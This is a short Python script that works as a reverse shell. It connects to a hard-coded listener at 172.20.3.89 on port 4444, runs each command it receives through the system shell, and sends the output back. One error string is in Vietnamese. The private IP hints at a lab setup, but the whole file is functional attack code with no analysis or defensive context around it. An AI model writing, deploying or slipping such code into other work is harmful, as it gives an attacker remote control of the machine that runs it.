import socket
import subprocess

# LISTENER_IP = "127.0.0.1"
LISTENER_IP = "172.20.3.89"
LISTENER_PORT = 4444

def create_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LISTENER_IP, LISTENER_PORT))

        while True:
            command = s.recv(1024).decode("utf-8")
            if command.strip().lower() == "exit":
                break

            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            output = process.stdout.read() + process.stderr.read()

            if output:
                s.send(output)
            else:
                s.send(b"[No output]\n")

    except Exception as e:
        s.send(f"[Lỗi]: {e}\n".encode())
    finally:
        s.close()

if __name__ == "__main__":
    create_shell()
